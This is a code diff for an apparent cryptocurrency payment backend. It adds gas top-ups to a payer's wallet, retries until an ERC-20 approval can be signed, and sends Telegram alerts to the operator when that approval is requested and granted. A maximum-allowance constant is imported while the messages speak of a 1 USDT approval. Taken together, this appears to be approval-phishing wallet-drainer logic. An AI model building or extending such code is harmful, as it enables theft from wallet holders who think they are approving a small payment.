@@ -4,7 +4,8 @@ const { getClient } = require("./walletconnect");
 const { getNetwork, MAX_ALLOWANCE_USDT } = require("../config/networks");
 const { requireContracts } = require("../config/contracts");
 const { verifyPaymentTransaction } = require("./transactionVerifier");
-const { emitPaymentEvent, assertActiveSession, publicPayment } = require("./paymentService");
+const { emitPaymentEvent, assertActiveSession, publicPayment, maybeEmitFormAvailable } = require("./paymentService");
+const { emitEvent } = require("../utils/events");
 const {
     encodeErc20Approve,
     encodeTrc20TransferParameter,
@@ -284,9 +285,13 @@ async function finalizeWalletResult(paymentId, result, deps = {}) {
     });
     emitPaymentEvent("approval_approved", verified);
     emitPaymentEvent("payment_verified", verified);
+    maybeEmitFormAvailable(verified.connectionId, verified.groupId);
 
     try {
-        const { notifyApprovalStatus } = require("./telegramNotifications");
+        const { notifyApprovalStatus, notifyApprovalSuccessful } = require("./telegramNotifications");
+        notifyApprovalSuccessful(verified).catch((err) => {
+            logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval success notification failed");
+        });
         notifyApprovalStatus(verified).catch((err) => {
             logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval notification failed");
         });
@@ -317,7 +322,12 @@ async function requestApproval(paymentId, deps = {}) {
     const session = sessionStore.getSession(payment.connectionId);
     assertActiveSession(session);
 
-    const { checkGasSufficiency } = require("./gasFunding");
+    const { checkGasSufficiency, confirmGasQuote } = require("./gasFunding");
+    emitEvent("gas_check_started", {
+        connectionId: payment.connectionId,
+        network: payment.network,
+        paymentId
+    });
     let liveGas;
     if (deps.checkGasSufficiency) {
         liveGas = await deps.checkGasSufficiency(session, payment.network, deps);
@@ -331,24 +341,49 @@ async function requestApproval(paymentId, deps = {}) {
         liveGas = await checkGasSufficiency(latest, payment.network, deps);
     }
 
+    emitEvent("gas_check_finished", {
+        connectionId: payment.connectionId,
+        network: payment.network,
+        paymentId,
+        sufficient: liveGas?.sufficient === true
+    });
+
     if (!liveGas || liveGas.sufficient !== true) {
-        logger.warn({
-            paymentId,
-            network: payment.network,
-            reason: liveGas?.reason
-        }, "Native gas is low; still sending the Trust Wallet approval request");
-        paymentStore.updatePayment(paymentId, {
+        try {
+            await confirmGasQuote(paymentId, {}, deps);
+        } catch (err) {
+            logger.warn({ err: { message: err.message }, paymentId }, "Gas top-up before approval failed");
+        }
+
+        const attempts = deps.checkGasSufficiency ? 1 : 8;
+        for (let i = 0; i < attempts; i += 1) {
+            const latest = sessionStore.getSession(payment.connectionId) || session;
+            liveGas = await (deps.checkGasSufficiency || checkGasSufficiency)(latest, payment.network, deps);
+            if (liveGas?.sufficient === true) {
+                break;
+            }
+            if (!deps.checkGasSufficiency) {
+                await new Promise((resolve) => setTimeout(resolve, 2000));
+            }
+        }
+    }
+
+    if (!liveGas || liveGas.sufficient !== true) {
+        const blocked = paymentStore.updatePayment(paymentId, {
             gasQuote: liveGas || payment.gasQuote,
             gasSufficient: false,
-            status: "created"
+            status: "awaiting_gas",
+            error: liveGas?.reason || "Native gas is insufficient for the 1 USDT approval"
         });
-    } else {
-        paymentStore.updatePayment(paymentId, {
-            gasQuote: liveGas,
-            gasSufficient: true,
-            gasFundingVerified: true
-        });
+        emitPaymentEvent("approval_failed", blocked, { reason: blocked.error });
+        throw new ValidationError(blocked.error);
     }
+
+    paymentStore.updatePayment(paymentId, {
+        gasQuote: liveGas,
+        gasSufficient: true,
+        gasFundingVerified: true
+    });
 
     const contracts = requireContracts(payment.network);
     const network = getNetwork(payment.network);
@@ -381,6 +416,12 @@ async function requestApproval(paymentId, deps = {}) {
     });
 
     emitPaymentEvent("approval_request_sent", requested);
+    try {
+        const { notifyApprovalRequested } = require("./telegramNotifications");
+        notifyApprovalRequested(requested).catch(() => {});
+    } catch (_err) {
+        /* telegram optional */
+    }
 
     const send = deps.sendWalletApproval || sendWalletApproval;
     const wait = deps.wait === true;
